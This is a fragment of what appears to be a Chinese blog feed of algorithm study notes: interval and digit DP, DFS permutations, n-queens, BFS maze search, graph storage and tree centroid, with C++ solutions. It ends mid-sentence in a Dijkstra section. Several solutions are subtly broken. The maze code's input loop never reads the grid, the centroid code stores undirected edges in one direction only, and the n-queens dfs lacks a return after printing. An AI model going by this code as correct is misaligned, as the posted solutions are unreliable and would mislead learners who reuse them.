href="#区间DP" class="headerlink" title="区间DP"></a>区间DP</h2><h3 id="石子合并"><a href="#石子合并" class="headerlink" title="石子合并"></a>石子合并</h3><p>设有 N 堆石子排成一排，其编号为 1,2,3,…,N。</p><p>每堆石子有一定的质量，可以用一个整数来描述，现在要将这 N 堆石子合并成为一堆。</p><p>每次只能合并相邻的两堆，合并的代价为这两堆石子的质量之和，合并后与这两堆石子相邻的石子将和新堆相邻，合并时由于选择的顺序不同，合并的总代价也不相同。</p><p>例如有 4 堆石子分别为 1 3 5 2， 我们可以先合并 1、2 堆，代价为 4，得到 4 5 2， 又合并 1、2 堆，代价为 9，得到 9 2 ，再合并得到 11，总代价为 4+9+11=24；</p><p>如果第二步是先合并 2、3 堆，则代价为 7，得到 4 7，最后一次合并代价为 11，总代价为 4+7+11=22。</p><p>问题是：找出一种合理的方法，使总的代价最小，输出最小代价。</p><p><strong>输入格式</strong><br>第一行一个数 N 表示石子的堆数 N。</p><p>第二行 N 个数，表示每堆石子的质量(均不超过 1000)。</p><p><strong>输出格式</strong><br>输出一个整数，表示最小代价。</p><p><strong>数据范围</strong><br>1≤N≤300<br><strong>输入样例</strong>：<br>4<br>1 3 5 2<br><strong>输出样例</strong>：<br>22</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303171846396.png" alt="image-20230317184620318"></p><p><strong>代码：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">310</span>;<br><span class="hljs-type">int</span> s[N];<br><span class="hljs-type">int</span> f[N][N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cin&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;s[i];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) s[i]+=s[i<span class="hljs-number">-1</span>];<br><br><span class="hljs-comment">//遍历区间长度</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> len=<span class="hljs-number">2</span>;len&lt;=n;len++)&#123;<br><span class="hljs-comment">//遍历起点</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i+len<span class="hljs-number">-1</span>&lt;=n;i++)<br>&#123;<br><span class="hljs-type">int</span> l=i,r=i+len<span class="hljs-number">-1</span>;<br>f[l][r]=<span class="hljs-number">1e8</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=l;k&lt;r;k++)<br>&#123;<br>f[l][r]=<span class="hljs-built_in">min</span>(f[l][r],f[l][k]+f[k+<span class="hljs-number">1</span>][r]+s[r]-s[l<span class="hljs-number">-1</span>]);<br>&#125;<br>&#125;<br>&#125;<br><br>cout&lt;&lt;f[<span class="hljs-number">1</span>][n]&lt;&lt;endl;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="数位统计DP"><a href="#数位统计DP" class="headerlink" title="数位统计DP"></a>数位统计DP</h2><h3 id="数字问题"><a href="#数字问题" class="headerlink" title="数字问题"></a>数字问题</h3><p>给定两个整数 a 和 b，求 a 和 b 之间的所有数字中0~9的出现次数。</p><p>例如，a=1024，b=1032，则 a 和 b 之间共有9个数如下：</p><p>1024 1025 1026 1027 1028 1029 1030 1031 1032</p><p>其中‘0’出现10次，‘1’出现10次，‘2’出现7次，‘3’出现3次等等…</p><p><strong>输入格式</strong><br>输入包含多组测试数据。</p><p>每组测试数据占一行，包含两个整数 a 和 b。</p><p>当读入一行为0 0时，表示输入终止，且该行不作处理。</p><p><strong>输出格式</strong><br>每组数据输出一个结果，每个结果占一行。</p><p>每个结果包含十个用空格隔开的数字，第一个数字表示‘0’出现的次数，第二个数字表示‘1’出现的次数，以此类推。</p><p><strong>数据范围</strong><br>0&lt;a,b&lt;100000000</p>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搜索与图论</title>
    <link href="/post/%E6%90%9C%E7%B4%A2%E4%B8%8E%E5%9B%BE%E8%AE%BA.html"/>
    <url>/post/%E6%90%9C%E7%B4%A2%E4%B8%8E%E5%9B%BE%E8%AE%BA.html</url>
    
    <content type="html"><![CDATA[<h1 id="搜索与图论"><a href="#搜索与图论" class="headerlink" title="搜索与图论"></a>搜索与图论</h1><h2 id="1-深度优先搜索-DFS"><a href="#1-深度优先搜索-DFS" class="headerlink" title="1.深度优先搜索 DFS"></a>1.深度优先搜索 DFS</h2><p>特点：向深度搜到头再回溯</p><p>数据结构：栈</p><p>空间：O(h)</p><p>搜到的点不一定具有“最短性”</p><p>两个重要概念：回溯和剪枝</p><p>每个DFS都对应一条最短路</p><h3 id="排列数字"><a href="#排列数字" class="headerlink" title="排列数字"></a>排列数字</h3><p>给定一个整数 n，将数字 1∼n 排成一排，将会有很多种排列方法。</p><p>现在，请你按照字典序将所有的排列方法输出。</p><p>输入格式</p><p>共一行，包含一个整数 n。</p><p>输出格式</p><p>按字典序输出所有排列方案，每个方案占一行。</p><p>数据范围</p><p>1≤n≤7</p><p>输入样例：</p><p>3<br>输出样例：</p><p>1 2 3<br>1 3 2<br>2 1 3<br>2 3 1<br>3 1 2<br>3 2 1</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> n;<br><span class="hljs-comment">//最后输出的序列</span><br><span class="hljs-type">int</span> res[N];<br><span class="hljs-comment">//判断每个数是否选过</span><br><span class="hljs-type">bool</span> st[N];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span></span>&#123;<br><span class="hljs-comment">//本质是递归，需要有出口</span><br><span class="hljs-comment">//当遍历到最底层的时候输出序列，返回向上层回溯</span><br><span class="hljs-keyword">if</span>(u==n)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>cout&lt;&lt;res[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br>cout&lt;&lt;endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br><span class="hljs-keyword">if</span>(!st[i])&#123;<br>res[u]=i;<br>st[i]=<span class="hljs-literal">true</span>;<br><span class="hljs-built_in">dfs</span>(u+<span class="hljs-number">1</span>);<br><span class="hljs-comment">//恢复现场</span><br>st[i]=<span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br><br><span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="n-皇后问题"><a href="#n-皇后问题" class="headerlink" title="n-皇后问题"></a>n-皇后问题</h3><p>n−皇后问题是指将 n 个皇后放在 n×n 的国际象棋棋盘上，使得皇后不能相互攻击到，即任意两个皇后都不能处于同一行、同一列或同一斜线上。</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303112014752.png" alt="img"></p><p>现在给定整数 n，请你输出所有的满足条件的棋子摆法。</p><p>输入格式：</p><p>共一行，包含整数 n。</p><p>输出格式：</p><p>每个解决方案占 n 行，每行输出一个长度为 n 的字符串，用来表示完整的棋盘状态。</p><p>其中 . 表示某一个位置的方格状态为空，Q 表示某一个位置的方格上摆着皇后。</p><p>每个方案输出完成后，输出一个空行。</p><p>注意：行末不能有多余空格。</p><p>输出方案的顺序任意，只要不重复且没有遗漏即可。</p><p>数据范围：</p><p>1≤n≤9</p><p>输入样例：</p><p>4<br>输出样例：</p><p>.Q..<br>…Q<br>Q…<br>..Q.</p><p>..Q.<br>Q…<br>…Q<br>.Q..</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">10</span>;<br><br><br><span class="hljs-type">char</span> g[N][N];<br><span class="hljs-comment">//bool st[N];</span><br><span class="hljs-type">bool</span> col[N],dg[N],udg[N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span></span>&#123;<br><span class="hljs-comment">//出口</span><br><span class="hljs-keyword">if</span>(u==n)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)&#123;<br>cout&lt;&lt;g[i][j];<br>&#125;<br>cout&lt;&lt;endl;<br>&#125;<br>cout&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br><span class="hljs-keyword">if</span>(!col[i]&amp;&amp;!dg[u+i]&amp;&amp;!udg[n-u+i])&#123;<br>g[u][i]=<span class="hljs-string">&#x27;Q&#x27;</span>;<br>col[i]=dg[u+i]=udg[n-u+i]=<span class="hljs-literal">true</span>;<br><span class="hljs-built_in">dfs</span>(u+<span class="hljs-number">1</span>);<br><span class="hljs-comment">//恢复现场</span><br>col[i]=dg[u+i]=udg[n-u+i]=<span class="hljs-literal">false</span>;<br>g[u][i]=<span class="hljs-string">&#x27;.&#x27;</span>;<br><br>&#125;<br>&#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br><span class="hljs-comment">//初始化二维数组</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>g[i][j]=<span class="hljs-string">&#x27;.&#x27;</span>;<br><br><span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-宽度优先搜索-BFS"><a href="#2-宽度优先搜索-BFS" class="headerlink" title="2.宽度优先搜索 BFS"></a>2.宽度优先搜索 BFS</h2><p>特点：搜完一层再搜下一层</p><p>数据结构：队列</p><p>空间：O(2^h)</p><p>搜到的点具有“最短性”</p><h3 id="走迷宫"><a href="#走迷宫" class="headerlink" title="走迷宫"></a>走迷宫</h3><p>给定一个 n×m 的二维整数数组，用来表示一个迷宫，数组中只包含 0 或 1，其中 0 表示可以走的路，1 表示不可通过的墙壁。</p><p>最初，有一个人位于左上角 (1,1) 处，已知该人每次可以向上、下、左、右任意一个方向移动一个位置。</p><p>请问，该人从左上角移动至右下角 (n,m) 处，至少需要移动多少次。</p><p>数据保证 (1,1) 处和 (n,m) 处的数字为 0，且一定至少存在一条通路。</p><p>输入格式<br>第一行包含两个整数 n 和 m。</p><p>接下来 n 行，每行包含 m 个整数（0 或 1），表示完整的二维数组迷宫。</p><p>输出格式<br>输出一个整数，表示从左上角移动至右下角的最少移动次数。</p><p>数据范围<br>1≤n,m≤100<br>输入样例：<br>5 5<br>0 1 0 0 0<br>0 1 0 1 0<br>0 0 0 0 0<br>0 1 1 1 0<br>0 0 0 1 0<br>输出样例：<br>8</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">110</span>;<br><span class="hljs-type">int</span> n,m;<br><span class="hljs-comment">//存点到起点的距离(层数)</span><br><span class="hljs-type">int</span> dist[N][N];<br><span class="hljs-comment">//存地图</span><br><span class="hljs-type">int</span> g[N][N];<br><br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; PII;<br><br><span class="hljs-comment">//左下右上</span><br><span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>&#125;,dy[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">-1</span>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bfs</span><span class="hljs-params">(<span class="hljs-type">int</span> start,<span class="hljs-type">int</span> end)</span></span>&#123;<br>queue&lt;PII&gt; q;<br><span class="hljs-built_in">memset</span>(dist,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span> dist);<br><br>dist[start][end]=<span class="hljs-number">0</span>;<br>q.<span class="hljs-built_in">push</span>(&#123;start,end&#125;);<br><br><span class="hljs-keyword">while</span>(q.<span class="hljs-built_in">size</span>())&#123;<br>PII t=q.<span class="hljs-built_in">front</span>();<span class="hljs-comment">//返回列表第一个元素</span><br>q.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)&#123;<br><span class="hljs-type">int</span> x=t.first+dx[i],y=t.second+dy[i];<br><span class="hljs-keyword">if</span>(x&gt;=<span class="hljs-number">0</span>&amp;&amp;x&lt;n&amp;&amp;y&gt;=<span class="hljs-number">0</span>&amp;&amp;y&lt;m&amp;&amp;dist[x][y]==<span class="hljs-number">-1</span>&amp;&amp;g[x][y]==<span class="hljs-number">0</span>)&#123;<br>dist[x][y]=dist[t.first][t.second]+<span class="hljs-number">1</span>;<br>q.<span class="hljs-built_in">push</span>(&#123;x,y&#125;);<br>&#125;<br><br>&#125;<br>&#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cin&gt;&gt;n&gt;&gt;m;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=m;j&lt;m;j++)&#123;<br>cin&gt;&gt;g[i][j];<br>&#125;<br>&#125;<br><span class="hljs-built_in">bfs</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>cout&lt;&lt;dist[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>]&lt;&lt;endl;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="3-树与图的存储"><a href="#3-树与图的存储" class="headerlink" title="3.树与图的存储"></a>3.树与图的存储</h2><p>1.邻接矩阵</p><p>g[a][b]存储a-b</p><p>2.邻接表(用单链表的拉链法实现)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 对于每个点k，开一个单链表，存储k所有可以走到的点。h[k]存储这个单链表的头结点</span><br><span class="hljs-type">int</span> h[N],e[N],ne[N],idx;<br><span class="hljs-comment">//添加一条边a-&gt;b  相当于在头结点插入</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span>&#123;<br>    e[idx]=b,ne[idx]=h[a],h[a]=idx++;<br>&#125;<br><span class="hljs-comment">//初始化</span><br>idx=<span class="hljs-number">0</span>;<br><span class="hljs-comment">//让所有头结点都指向-1(即空结点)</span><br><span class="hljs-built_in">memset</span>(h,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span> h);<br></code></pre></td></tr></table></figure><h2 id="4-树与图的深度优先遍历"><a href="#4-树与图的深度优先遍历" class="headerlink" title="4.树与图的深度优先遍历"></a>4.树与图的深度优先遍历</h2><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span></span><br><span class="hljs-function"></span>&#123;<br>    st[u]=<span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=h[u];i!=<span class="hljs-number">-1</span>;i=ne[i])&#123;<br>        <span class="hljs-type">int</span> j=e[i];<br>        <span class="hljs-keyword">if</span>(!st[j]) <span class="hljs-built_in">dfs</span>(j);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="树的重心"><a href="#树的重心" class="headerlink" title="树的重心"></a>树的重心</h3><p>给定一颗树，树中包含 n 个结点（编号 1∼n）和 n−1 条无向边。</p><p>请你找到树的重心，并输出将重心删除后，剩余各个连通块中点数的最大值。</p><p>重心定义：重心是指树中的一个结点，如果将这个点删除后，剩余各个连通块中点数的最大值最小，那么这个节点被称为树的重心。</p><p>输入格式<br>第一行包含整数 n，表示树的结点数。</p><p>接下来 n−1 行，每行包含两个整数 a 和 b，表示点 a 和点 b 之间存在一条边。</p><p>输出格式<br>输出一个整数 m，表示将重心删除后，剩余各个连通块中点数的最大值。</p><p>数据范围<br>1≤n≤105<br>输入样例<br>9<br>1 2<br>1 7<br>1 4<br>2 8<br>2 5<br>4 3<br>3 9<br>4 6<br>输出样例：<br>4</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">100010</span>,M=<span class="hljs-number">2</span>*N;<br><span class="hljs-type">int</span> h[N],e[M],ne[M],idx=<span class="hljs-number">0</span>;<br><span class="hljs-type">bool</span> st[N];<br><span class="hljs-type">int</span> ans=N;<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span>&#123;<br>e[idx]=b,ne[idx]=h[a],h[a]=idx++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span></span>&#123;<br>st[u]=<span class="hljs-literal">true</span>;<br><span class="hljs-type">int</span> Sum=<span class="hljs-number">1</span>;<span class="hljs-comment">//当前该数的结点数，这里表示目前只算到自己的一个结点</span><br><span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<span class="hljs-comment">//子树中最多结点数，目前为0</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=h[u];i!=<span class="hljs-number">-1</span>;i=ne[i])&#123;<br><span class="hljs-type">int</span> j=e[i];<br><span class="hljs-keyword">if</span>(!st[j])&#123;<br><span class="hljs-type">int</span> s=<span class="hljs-built_in">dfs</span>(j);<br>Sum+=s;<br>res=<span class="hljs-built_in">max</span>(s,res);<br>&#125;<br>&#125;<br>res=<span class="hljs-built_in">max</span>(res,n-Sum);<br>ans=<span class="hljs-built_in">min</span>(ans,res);<br><span class="hljs-keyword">return</span> Sum;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">memset</span>(h,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span> h);<br>cin&gt;&gt;n;<br><br><span class="hljs-type">int</span> m=n<span class="hljs-number">-1</span>;<br><span class="hljs-keyword">while</span>(m--)&#123;<br><span class="hljs-type">int</span> a,b;<br>cin&gt;&gt;a&gt;&gt;b;<br><span class="hljs-built_in">add</span>(a,b);<br>&#125;<br><span class="hljs-built_in">dfs</span>(<span class="hljs-number">1</span>);<br>cout&lt;&lt;ans&lt;&lt;endl;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-树与图的宽度优先遍历"><a href="#5-树与图的宽度优先遍历" class="headerlink" title="5.树与图的宽度优先遍历"></a>5.树与图的宽度优先遍历</h2><h3 id="图中点的层次"><a href="#图中点的层次" class="headerlink" title="图中点的层次"></a>图中点的层次</h3><p>题目如下：<br>给定一个 n 个点 m 条边的有向图，图中可能存在重边和自环。</p><p>所有边的长度都是 1，点的编号为 1∼n。</p><p>请你求出 1 号点到 n 号点的最短距离，如果从 1 号点无法走到 n 号点，输出 −1。</p><p>输入格式<br>第一行包含两个整数 n 和 m。</p><p>接下来 m 行，每行包含两个整数 a 和 b，表示存在一条从 a 走到 b 的长度为 1 的边。</p><p>输出格式<br>输出一个整数，表示 1 号点到 n 号点的最短距离。</p><p>数据范围<br>1≤n,m≤10^5<br>输入样例：</p><p>4 5<br>1 2<br>2 3<br>3 4<br>1 3<br>1 4<br>输出样例：<br>1</p><h2 id="6-拓扑排序"><a href="#6-拓扑排序" class="headerlink" title="6.拓扑排序"></a>6.拓扑排序</h2><h2 id="7-最短路"><a href="#7-最短路" class="headerlink" title="7.最短路"></a>7.最短路</h2><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303111407530.png" alt="image-20230311140724309"></p><h3 id="7-1迪杰斯特拉算法求最短路"><a href="#7-1迪杰斯特拉算法求最短路" class="headerlink" title="7.1迪杰斯特拉算法求最短路"></a>7.1迪杰斯特拉算法求最短路</h3><p>给定一个 n 个点 m 条边的有向图，图中可能存在重边和自环，所有边权均为正值。</p><p><strong>（重边在最短路中取较小的一边即可，自环没必要取）</strong></p><p>请你求出 1 号点到 n 号点的最短距离，如果无法从 1 号点走到 n 